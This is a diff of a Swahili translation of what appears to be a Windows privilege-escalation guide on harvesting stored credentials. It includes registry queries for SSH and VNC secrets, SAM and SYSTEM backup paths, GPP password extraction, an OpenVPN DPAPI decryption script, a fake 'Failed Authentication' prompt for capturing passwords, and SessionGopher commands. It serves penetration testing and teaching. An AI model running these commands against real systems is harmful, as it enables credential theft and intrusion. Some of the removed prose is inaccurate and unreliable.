-Putty ni programu ya mteja wa SSH inayotumiwa kwa kawaida kwa kuingia kwa mbali kwenye seva. Wakati unatumia Putty kwa mara ya kwanza kuingia kwenye seva, itakuhitaji kukubali au kuthibitisha ufunguo wa mwenyeji wa SSH kabla ya kuendelea. Ufunguo huu wa mwenyeji unahakikisha kuwa unawasiliana na seva sahihi na sio seva ya uongo.
-
-Ufunguo wa mwenyeji wa SSH unapatikana kwenye faili ya "known_hosts" kwenye mfumo wako. Faili hii inaorodhesha ufunguo wa mwenyeji wa SSH kwa kila seva ambayo umewahi kuunganisha kupitia Putty. Kwa kawaida, faili hii iko katika saraka ya nyumbani ya mtumiaji wako.
-
-Ikiwa unataka kusafisha au kusasisha ufunguo wa mwenyeji wa SSH kwenye Putty, unaweza kufuata hatua zifuatazo:
-
-1. Fungua Putty na nenda kwenye "SSH" kwenye menyu ya kushoto.
-2. Chagua "Auth" chini ya "SSH" na bofya kwenye kisanduku cha "Browse" chini ya "Private key file for authentication".
-3. Chagua faili ya ufunguo wa mwenyeji wa SSH unayotaka kutumia.
-4. Bofya "Open" ili kuanza kuingia kwenye seva.
-
-Baada ya kufuata hatua hizi, Putty itatumia ufunguo wa mwenyeji wa SSH uliochaguliwa kwa kuingia kwenye seva. Ni muhimu kuhakikisha kuwa ufunguo wa mwenyeji wa SSH unalingana na ufunguo wa mwenyeji uliohifadhiwa kwenye faili ya "known_hosts" ili kuepuka shida za usalama.
+### Funguo za Mwenyeji wa SSH za Putty
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 ```
-### Vichimbakazi vya SSH kwenye rejista
+### Funguo za SSH kwenye rejista
 
-Vichimbakazi vya SSH vya kibinafsi vinaweza kuhifadhiwa ndani ya ufunguo wa rejista `HKCU\Software\OpenSSH\Agent\Keys` hivyo unapaswa kuangalia ikiwa kuna kitu chochote cha kuvutia ndani yake:
+Funguo za kibinafsi za SSH zinaweza kuhifadhiwa ndani ya funguo la rejista `HKCU\Software\OpenSSH\Agent\Keys` kwa hivyo unapaswa kuangalia ikiwa kuna kitu cha kuvutia ndani ya hapo:
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
-Ikiwa utapata kuingia yoyote ndani ya njia hiyo, labda itakuwa funguo ya SSH iliyohifadhiwa. Inahifadhiwa kwa njia ya kusimbwa lakini inaweza kufunguliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
-Maelezo zaidi kuhusu mbinu hii yanapatikana hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+Ikiwa utapata kuingia yoyote ndani ya njia hiyo, huenda ikawa funguo ya SSH iliyohifadhiwa. Imehifadhiwa kwa njia ya kielelezo lakini inaweza kufunguliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
+Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-Ikiwa huduma ya `ssh-agent` haiendeshi na unataka ianze moja kwa moja wakati wa kuanza, endesha:
+Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze moja kwa moja wakati wa kuanza, endesha:
 ```bash
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 {% hint style="info" %}
-Inaonekana kwamba mbinu hii haifai tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziweka kwa kutumia `ssh-add` na kuingia kupitia ssh kwenye kifaa. Usajili wa HKCU\Software\OpenSSH\Agent\Keys haupo na procmon haikugundua matumizi ya `dpapi.dll` wakati wa uwakilishi wa funguo usio sawa.
+Inaonekana kama mbinu hii sio halali tena. Nilijaribu kuunda baadhi ya funguo za ssh, kuziweka kwa kutumia `ssh-add` na kuingia kupitia ssh kwenye mashine. Usajili wa HKCU\Software\OpenSSH\Agent\Keys haupo na procmon haikubaini matumizi ya `dpapi.dll` wakati wa uwakilishi wa funguo usio na uwiano.
 {% endhint %}
 
-### Faili zisizohitaji ushiriki wa mtumiaji
+### Faili zisizohitaji uangalizi
 ```
 C:\Windows\sysprep\sysprep.xml
 C:\Windows\sysprep\sysprep.inf
@@ -1247,7 +943,7 @@ dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>n
 ```
 Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum\_unattend_
 
-Mfano wa maudhui:
+Mfano wa yaliyomo:
 ```xml
 <component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
 <AutoLogon>
@@ -1267,16 +963,6 @@ Mfano wa maudhui:
 </UserAccounts>
 ```
 ### Nakala za SAM & SYSTEM
-
-Kwa kawaida, Windows hufanya nakala za faili za SAM na SYSTEM kwenye folda ya `C:\Windows\System32\config\RegBack`. Nakala hizi zinaweza kutumika kwa kusudi la kurejesha faili za asili za SAM na SYSTEM ikiwa zinaharibiwa au kuharibiwa vibaya.
-
-Unaweza kufikia nakala hizi kwa kufuata hatua zifuatazo:
-
-1. Nenda kwenye folda ya `C:\Windows\System32\config\RegBack`.
-2. Fungua nakala ya hivi karibuni ya faili ya SAM na SYSTEM.
-3. Nakala hizi zinaweza kuwa zimehifadhiwa kwenye folda ya `C:\Windows\System32\config\RegBack\RegBack`.
-
-Ni muhimu kutambua kuwa nakala hizi za SAM na SYSTEM zinaweza kuwa zimepitwa na wakati au zisizofaa kwa sababu zinaweza kuwa zimefanyiwa mabadiliko au kuharibiwa. Kwa hivyo, ni muhimu kuzingatia hili wakati wa kuzitumia kwa madhumuni ya kurejesha.
 ```bash
 # Usually %SYSTEMROOT% = C:\Windows
 %SYSTEMROOT%\repair\SAM
@@ -1286,17 +972,7 @@ Ni muhimu kutambua kuwa nakala hizi za SAM na SYSTEM zinaweza kuwa zimepitwa na 
 %SYSTEMROOT%\System32\config\SYSTEM
 %SYSTEMROOT%\System32\config\RegBack\system
 ```
-### Vitambulisho vya Wingu
-
-Cloud credentials ni maelezo ya uwakilishi ambayo hutumiwa kuthibitisha utambulisho na kutoa ufikiaji wa rasilimali za wingu. Vitambulisho hivi ni muhimu sana katika mazingira ya wingu kwa sababu hutoa njia ya kudhibiti ufikiaji na usimamizi wa rasilimali hizo.
-
-Kuna aina mbili kuu za vitambulisho vya wingu:
-
-1. **Access Keys**: Hizi ni jozi ya ufunguo wa siri na ufunguo wa umma ambao hutumiwa kuthibitisha utambulisho wa mtumiaji na kutoa ufikiaji wa rasilimali za wingu. Ufunguo wa siri unapaswa kuhifadhiwa salama na sio kugawanywa na mtu yeyote isipokuwa mmiliki wa akaunti. Ufunguo wa umma unaweza kugawanywa na kutumiwa na huduma za wingu kuthibitisha utambulisho wa mtumiaji.
-
-2. **IAM Roles**: Hizi ni vitambulisho vya wingu ambavyo hutoa ufikiaji wa rasilimali za wingu kwa watumiaji au huduma zingine za wingu. IAM roles zinaweza kuwa na sifa zilizopewa ambazo zinadhibiti ni rasilimali gani zinazopatikana na jinsi wanavyoweza kutumiwa.
-
-Ni muhimu sana kulinda vitambulisho vya wingu na kutekeleza mazoea bora ya usalama kama vile kuzificha vizuri, kuzibadilisha mara kwa mara, na kuzitumia tu wakati zinahitajika. Pia, ni muhimu kufuatilia na kusasisha vitambulisho vya wingu ili kuzuia matumizi yasiyoruhusiwa na kudumisha usalama wa rasilimali za wingu.
+### Vyeti vya Wingu
 ```bash
 #From user home
 .aws\credentials
@@ -1312,9 +988,9 @@ Tafuta faili inayoitwa **SiteList.xml**
 
 ### Cached GPP Password
 
-Kipengele kilikuwepo hapo awali ambacho kiliruhusu kupeleka akaunti za msimamizi wa ndani za desturi kwenye kikundi cha mashine kupitia Sera ya Kikundi ya Mapendeleo (GPP). Walakini, njia hii ilikuwa na dosari kubwa za usalama. Kwanza, Vitu vya Sera ya Kikundi (GPOs), vilivyohifadhiwa kama faili za XML katika SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nywila katika GPP hizi, zilizofichwa kwa kutumia AES256 kwa kutumia ufunguo wa chaguo-msingi ulioelezewa kwa umma, zingeweza kufichuliwa na mtumiaji yeyote aliyeidhinishwa. Hii ilikuwa na hatari kubwa, kwani inaweza kuruhusu watumiaji kupata mamlaka ya juu.
+Kipengele kilikuwepo hapo awali ambacho kiliruhusu kupeleka akaunti za wasimamizi wa mitaa kwa kikundi cha mashine kupitia Mapendeleo ya Sera ya Kikundi (GPP). Hata hivyo, njia hii ilikuwa na kasoro kubwa za usalama. Kwanza, Vitu vya Sera ya Kikundi (GPOs), vilivyohifadhiwa kama faili za XML katika SYSVOL, vilikuwa vinaweza kufikiwa na mtumiaji yeyote wa kikoa. Pili, nywila ndani ya hizi GPPs, zilizofichwa kwa AES256 kwa kutumia ufunguo wa chaguo-msingi ulioelezewa hadharani, zingeweza kufichuliwa na mtumiaji yeyote aliyeidhinishwa. Hii ilileta hatari kubwa, kwani ingeweza kuruhusu watumiaji kupata mamlaka ya juu.
 
-Kupunguza hatari hii, kazi ilibuniwa ili kutafuta faili za GPP zilizohifadhiwa kwenye kache ambazo zina uga wa "cpassword" ambao sio tupu. Kupata faili kama hiyo, kazi inafichua nywila na kurudisha kitu cha PowerShell cha desturi. Kitu hiki kinajumuisha maelezo juu ya GPP na eneo la faili, kusaidia katika kutambua na kurekebisha dosari hii ya usalama.
+Ili kupunguza hatari hii, kazi ilibuniwa ili kutafuta faili za GPP zilizohifadhiwa kienyeji zikiwa na uga wa "cpassword" ambao si tupu. Kwa kupata faili kama hiyo, kazi hufichua nywila na kurudisha kitu cha PowerShell cha desturi. Kitu hiki kinajumuisha maelezo kuhusu GPP na eneo la faili, kusaidia katika kutambua na kurekebisha kasoro hii ya usalama.
 
 Tafuta katika `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_ kwa faili hizi:
 
@@ -1334,17 +1010,7 @@ Kutumia crackmapexec kupata nywila:
 ```bash
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
-### IIS Web Config
-
-### IIS Web Config
-
-IIS Web Config ni faili ya konfigurisheni ambayo inatumika kudhibiti na kusanidi tovuti zilizohifadhiwa kwenye seva ya IIS (Internet Information Services). Faili hii ina muundo wa XML na ina habari muhimu kuhusu jinsi tovuti inavyofanya kazi na inavyopatikana.
-
-Kwa kawaida, faili ya IIS Web Config iko katika saraka ya msingi ya tovuti na inaweza kuhaririwa kwa kutumia mhariri wa maandishi au zana maalum za usimamizi wa IIS.
-
-Faili ya IIS Web Config inaweza kubadilishwa ili kufanya mabadiliko kadhaa kwenye tovuti, kama vile kubadilisha mipangilio ya usalama, kuanzisha upya mipangilio ya URL, kudhibiti ufikiaji wa faili na saraka, na mengi zaidi.
-
-Kwa wapenzi wa udukuzi, faili ya IIS Web Config inaweza kuwa muhimu katika kutekeleza mbinu za kuboresha mamlaka ya ndani (local privilege escalation) kwenye mfumo wa Windows. Kwa kuchunguza na kuhariri faili hii, unaweza kupata maelezo muhimu ambayo yanaweza kukusaidia kupata mamlaka ya juu zaidi kwenye mfumo.
+### Mipangilio ya Wavuti ya IIS
 ```powershell
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
@@ -1358,7 +1024,7 @@ C:\inetpub\wwwroot\web.config
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
-Mfano wa web.config na siri za kuwakilisha:
+Mfano wa web.config na siri:
 ```xml
 <authentication mode="Forms">
 <forms name="login" loginUrl="/admin">
@@ -1368,13 +1034,7 @@ Mfano wa web.config na siri za kuwakilisha:
 </forms>
 </authentication>
 ```
-### Vyeti vya OpenVPN
-
-Kabla ya kuanza kufanya uchunguzi wa kina wa kuhakiki hatari za usalama, ni muhimu kupata vyeti vya OpenVPN. Vyeti hivi ni muhimu kwa kuanzisha uhusiano salama na seva ya OpenVPN. Kwa kawaida, vyeti vya OpenVPN hujumuisha faili mbili: faili ya ufunguo wa umma (public key) na faili ya ufunguo wa faragha (private key).
-
-Kwa kawaida, faili ya ufunguo wa umma ina kumalizia na .crt na faili ya ufunguo wa faragha ina kumalizia na .key. Vyote viwili ni muhimu kwa mchakato wa uwakilishi wa vyeti vya OpenVPN.
-
-Kwa kawaida, vyeti vya OpenVPN hupatikana kutoka kwa msimamizi wa mfumo au mtoa huduma wa OpenVPN. Ikiwa wewe ni mtumiaji wa OpenVPN, unaweza kuomba vyeti hivi kutoka kwa msimamizi wako au mtoa huduma wa OpenVPN. Vyeti hivi vinapaswa kuhifadhiwa kwa usalama na kutumiwa tu na watumiaji waliothibitishwa.
+### Maelezo ya OpenVPN
 ```csharp
 Add-Type -AssemblyName System.Security
 $keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
@@ -1395,43 +1055,6 @@ Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
 }
 ```
 ### Kumbukumbu
-
-Logs are records of events or actions that have occurred on a system. They are essential for troubleshooting, monitoring, and investigating security incidents. In the context of local privilege escalation, logs can be valuable sources of information for identifying vulnerabilities and potential attack vectors.
-
-#### Windows Event Logs
-
-Windows systems maintain various event logs that capture different types of events. Some of the key event logs include:
-
-- **Security**: Records security-related events such as logon attempts, privilege use, and system access.
-- **System**: Contains information about system events, such as startup and shutdown.
-- **Application**: Logs events generated by applications running on the system.
-
-These logs can be accessed using the Event Viewer tool or programmatically through the Windows Event Log API.
-
-#### Log Analysis
-
-Analyzing logs can help identify suspicious activities or indicators of compromise. Some common techniques for log analysis include:
-
-- **Searching for specific events**: Look for events related to privilege escalation, suspicious user activity, or unauthorized access attempts.
-- **Correlation**: Identify patterns or relationships between different log entries to gain a better understanding of the attack.
-- **Timeline analysis**: Construct a timeline of events to determine the sequence of actions taken by an attacker.
-- **Anomaly detection**: Use machine learning or statistical techniques to identify abnormal or unusual behavior.
-
-#### Log Retention
-
-It is important to ensure that logs are properly configured and retained for an appropriate period. Retaining logs for an extended period can be useful for forensic investigations and compliance requirements.
-
-#### Log Monitoring
-
-Implementing a log monitoring solution can help detect and respond to security incidents in a timely manner. This can involve setting up alerts for specific events, aggregating logs from multiple sources, and using automated analysis tools.
-
-#### Log Integrity
-
-To maintain the integrity of logs, it is crucial to protect them from unauthorized modification or deletion. This can be achieved by implementing access controls, using secure storage, and regularly backing up logs.
-
-#### Conclusion
-
-Logs play a vital role in local privilege escalation and overall system security. By effectively analyzing and monitoring logs, organizations can detect and mitigate potential security risks.
 ```bash
 # IIS
 C:\inetpub\logs\LogFiles\*
@@ -1441,7 +1064,7 @@ Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAct
 ```
 ### Uliza kwa sifa
 
-Unaweza daima **kuomba mtumiaji kuingiza sifa zake au hata sifa za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (tambua kuwa **kuuliza** moja kwa moja kwa **mteja** kwa **sifa** ni hatari sana):
+Unaweza **kuomba mtumiaji aingize sifa zake au hata sifa za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (tambua kwamba **kuuliza** moja kwa moja kwa **mteja** kwa **sifa** ni hatari sana):
 ```bash
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
 $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password
@@ -1449,9 +1072,9 @@ $cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::U
 #Get plaintext
 $cred.GetNetworkCredential() | fl
 ```
-### **Majina yanayowezekana ya faili zinazohifadhi siri**
+### **Jina la faili linalowezekana kuwa na siri**
 
-Faili maarufu ambazo kwa wakati mmoja zilikuwa zinahifadhi **maneno ya siri** kwa njia ya maandishi wazi au **Base64**
+Faili zinazojulikana ambazo kwa wakati fulani zilikuwa na **maneno ya siri** kwa **maandishi wazi** au **Base64**
 ```bash
 $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
 vnc.ini, ultravnc.ini, *vnc*
@@ -1526,52 +1149,52 @@ Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAct
 ```
 ### Vitambulisho katika RecycleBin
 
-Unapaswa pia kuangalia Bin ili kutafuta vitambulisho ndani yake.
+Unapaswa pia kuangalia Bin ili kutafuta vitambulisho ndani yake
 
-Kwa **kurejesha nywila** zilizohifadhiwa na programu kadhaa, unaweza kutumia: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)
+Kwa **kurejesha nywila** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)
 
-### Ndani ya usajili
+### Ndani ya rejista
 
-**Vitufe vingine vya usajili vinavyowezekana na vitambulisho**
+**Vitufe vingine vya rejista vinavyowezekana na vitambulisho**
 ```bash
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
 reg query "HKCU\Software\TightVNC\Server"
 reg query "HKCU\Software\OpenSSH\Agent\Key"
 ```
-[**Chukua funguo za openssh kutoka kwenye rejista.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+[**Chimbua funguo za openssh kutoka kwenye rejista.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
 ### Historia ya Vivinjari
 
-Unapaswa kuangalia kwa ajili ya dbs ambapo nywila kutoka **Chrome au Firefox** zimehifadhiwa.\
+Unapaswa kuangalia kwa dbs ambapo nywila kutoka **Chrome au Firefox** zimehifadhiwa.\
 Pia angalia historia, alamisho na vipendwa vya vivinjari ili labda baadhi ya **nywila zimehifadhiwa** hapo.
 
-Zana za kuchimbua nywila kutoka kwenye vivinjari:
+Vyombo vya kuchimbua nywila kutoka kwenye vivinjari:
 
 * Mimikatz: `dpapi::chrome`
 * [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
 * [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
 * [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)
 
-### **COM DLL Overwriting**
+### **Uwekaji wa COM DLL**
 
-**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows ambayo inaruhusu **mawasiliano** kati ya vipengele vya programu za lugha tofauti. Kila kipengele cha COM kina **kitambulisho cha darasa (CLSID)** na kila kipengele kinaweka wazi utendaji kupitia moja au zaidi ya vipengele vya interface, vilivyotambulishwa kupitia kitambulisho cha interface (IID).
+**Modeli ya Kipengele cha Kitu (COM)** ni teknolojia iliyojengwa ndani ya mfumo wa uendeshaji wa Windows inayoruhusu **mawasiliano** kati ya vipengele vya programu za lugha tofauti. Kila kipengele cha COM kina **tambulisho kupitia kitambulisho cha darasa (CLSID)** na kila kipengele hufunua utendaji kupitia moja au zaidi ya viunganishi, vilivyotambuliwa kupitia kitambulisho cha viunganishi (IIDs).
 
-Madarasa na vipengele vya COM vimefafanuliwa kwenye rejista chini ya **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na **HKEY\_**_**CLASSES\_**_**ROOT\Interface** mtawaliwa. Rejista hii inaundwa kwa kuchanganya **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**
+Darasa za COM na viunganishi vinafafanuliwa kwenye rejista chini ya **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** na **HKEY\_**_**CLASSES\_**_**ROOT\Interface** mtawalia. Rejista hii inajengwa kwa kuchanganya **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**
 
-Ndani ya CLSIDs ya rejista hii, unaweza kupata rejista ya mtoto **InProcServer32** ambayo ina thamani ya **default** inayoelekeza kwenye **DLL** na thamani inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).
+Ndani ya CLSIDs ya rejista hii unaweza kupata rejista ndogo **InProcServer32** ambayo ina thamani ya **msingi** inayoashiria kwenye **DLL** na thamani inayoitwa **ThreadingModel** inayoweza kuwa **Apartment** (Mmoja-Threaded), **Free** (Multi-Threaded), **Both** (Moja au Multi) au **Neutral** (Thread Neutral).
 
 ![](<../../.gitbook/assets/image (638).png>)
 
-Kimsingi, ikiwa unaweza **kubadilisha DLL yoyote** ambayo itatekelezwa, unaweza **kuongeza mamlaka** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.
+Kimsingi, ikiwa unaweza **kuweka juu ya DLL yoyote** ambayo itatekelezwa, unaweza **kupandisha vyeo** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.
 
-Ili kujifunza jinsi wadukuzi wanatumia COM Hijacking kama kipengele cha kudumu angalia:
+Ili kujifunza jinsi wadukuzi wanavyotumia Utekelezaji wa COM kama mbinu ya kudumu angalia:
 
 {% content-ref url="com-hijacking.md" %}
 [com-hijacking.md](com-hijacking.md)
 {% endcontent-ref %}
 
-### **Utafutaji wa Nywila za Kawaida kwenye faili na rejista**
+### **Utafutaji wa Jumla wa Nywila kwenye faili na rejista**
 
 **Tafuta maudhui ya faili**
 ```bash
@@ -1580,85 +1203,53 @@ findstr /si password *.xml *.ini *.txt *.config
 findstr /spin "password" *.*
 ```
 **Tafuta faili yenye jina fulani**
-
-Ikiwa unataka kutafuta faili yenye jina fulani kwenye mfumo wa Windows, unaweza kutumia amri ya `dir` kwenye Command Prompt. Amri ifuatayo itakusaidia kutafuta faili kwa jina lake:
-
-```plaintext
-dir /s /b "jina_la_faili"
-```
-
-- `/s` inaonyesha kuwa utafutaji utafanyika kwa njia ya rekodi zote, pamoja na folda zote zilizomo ndani ya folda kuu.
-- `/b` inaonyesha kuwa matokeo yataonyeshwa kwa njia ya njia kamili ya faili.
-
-Kwa mfano, ikiwa unataka kutafuta faili inayoitwa "document.txt", tumia amri ifuatayo:
-
-```plaintext
-dir /s /b "document.txt"
-```
-
-Amri hii itakupa njia kamili ya faili ikiwa faili hiyo ipo kwenye mfumo wako.
 ```bash
 dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
 where /R C:\ user.txt
 where /R C:\ *.ini
 ```
-**Tafuta usajili kwa majina ya funguo na nywila**
-
-Unaweza kutumia zana kama `reg` au `reg query` kutafuta usajili kwa majina ya funguo na nywila. Hapa kuna hatua za kufuata:
-
-1. Fungua Command Prompt (Amri ya Amri) kama msimamizi.
-2. Tumia amri ifuatayo kuchunguza usajili kwa majina ya funguo na nywila:
-
-   ```plaintext
-   reg query HKLM /f "password" /t REG_SZ /s
-   ```
-
-   Amri hii itatafuta usajili katika sehemu ya HKLM (HKEY_LOCAL_MACHINE) kwa majina ya funguo yaliyomo "password" na aina ya REG_SZ (aina ya neno la msingi). /s inaonyesha kutafuta kwa kina ndani ya usajili.
-
-3. Unaweza kubadilisha "password" na neno lingine au kuongeza vigezo vingine kulingana na mahitaji yako.
-
-Kwa kutumia amri hii, unaweza kutambua majina ya funguo na nywila zilizohifadhiwa kwenye usajili wa mfumo wako.
+**Tafuta rejista kwa majina ya funguo na nywila**
 ```bash
 REG QUERY HKLM /F "password" /t REG_SZ /S /K
 REG QUERY HKCU /F "password" /t REG_SZ /S /K
 REG QUERY HKLM /F "password" /t REG_SZ /S /d
 REG QUERY HKCU /F "password" /t REG_SZ /S /d
 ```
-### Zana za kutafuta nywila
+### Zana zinazotafuta nywila
 
-[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni program-jalizi ya msf** ambayo nimeiumba ili **kutekeleza moja kwa moja kila moduli ya metasploit POST inayotafuta nywila** ndani ya mwathiriwa.\
-[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) inatafuta moja kwa moja faili zote zinazotaja nywila zilizotajwa kwenye ukurasa huu.\
-[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kuchimbua nywila kutoka kwenye mfumo.
+[Zana ya **MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni programu-jalizi ya msf** niliyoitengeneza ili **kutekeleza moja kwa moja kila moduli ya metasploit POST inayotafuta nywila** ndani ya mhanga.\
+[Zana ya **Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta moja kwa moja faili zote zinazo nywila zilizotajwa kwenye ukurasa huu.\
+[Zana ya **Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kuchimbua nywila kutoka kwenye mfumo.
 
-Zana [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) inatafuta **vikao**, **majina ya watumiaji**, na **nywila** za zana kadhaa ambazo huhifadhi data hii kwa wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP).
+Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **vikao**, **majina ya watumiaji** na **nywila** za zana kadhaa zinazohifadhi data hii kwa maandishi wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)
 ```bash
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -Thorough
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
 ```
-## Wavuja wa Kusimamia
+## Mabano Yaliyovuja
 
-Fikiria kwamba **mchakato unaoendesha kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) na **upatikanaji kamili**. Mchakato huo huo **pia hujenga mchakato mpya** (`CreateProcess()`) **na mamlaka ya chini lakini kurithi kushughulikia wazi za mchakato mkuu**.\
-Kisha, ikiwa una **upatikanaji kamili wa mchakato uliopewa mamlaka ya chini**, unaweza kuchukua **kushughulikia wazi kwa mchakato uliopewa mamlaka** uliozalishwa na `OpenProcess()` na **kuingiza shellcode**.\
-[Soma mfano huu kwa maelezo zaidi juu ya **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
-[Soma **chapisho lingine kwa maelezo kamili zaidi juu ya jinsi ya kujaribu na kutumia kushughulikia wazi za michakato na nyuzi zilizorithiwa na viwango tofauti vya ruhusa (sio upatikanaji kamili tu)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
+Fikiria kwamba **mchakato unaoendeshwa kama SYSTEM unafungua mchakato mpya** (`OpenProcess()`) na **upatikanaji kamili**. Mchakato huo huo **pia huanzisha mchakato mpya** (`CreateProcess()`) **na mamlaka madogo lakini unarithi mabano yote yaliyofunguliwa ya mchakato kuu**.\
+Kisha, ikiwa una **upatikanaji kamili wa mchakato wa mamlaka ya chini**, unaweza kunasa **mabano yaliyofunguliwa ya mchakato wa mamlaka ya juu ulioanzishwa** na `OpenProcess()` na **kuingiza shellcode**.\
+[Soma mfano huu kwa maelezo zaidi kuhusu **jinsi ya kugundua na kutumia udhaifu huu**.](leaked-handle-exploitation.md)\
+[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kujaribu na kutumia mabano zaidi ya mchakato na nyuzi zilizorithiwa na viwango tofauti vya ruhusa (siyo upatikanaji kamili pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).
 
-## Uigaji wa Mteja wa Mipira Iliyopewa Jina
+## Uigaji wa Mteja wa Mabomba Yaliyopewa Jina
 
-Sehemu za kumbukumbu zilizoshirikiwa, inayojulikana kama **mipira**, inawezesha mawasiliano ya mchakato na uhamishaji wa data.
+Vipande vya kumbukumbu vilivyoshirikiwa, vinavyojulikana kama **mabomba**, huwezesha mawasiliano ya mchakato na uhamishaji wa data.
 
-Windows inatoa kipengele kinachoitwa **Mipira Iliyopewa Jina**, kuruhusu michakato isiyohusiana kushiriki data, hata juu ya mitandao tofauti. Hii inafanana na muundo wa mteja / seva, na majukumu yaliyofafanuliwa kama **seva ya mpira iliyo na jina** na **mteja wa mpira iliyo na jina**.
+Windows hutoa kipengele kinachoitwa **Mabomba Yaliyopewa Jina**, kuruhusu michakato isiyohusiana kushiriki data, hata juu ya mitandao tofauti. Hii inafanana na muundo wa mteja/mhudumu, na majukumu yaliyofafanuliwa kama **mhudumu wa mabomba yaliyopewa jina** na **mteja wa mabomba yaliyopewa jina**.
 
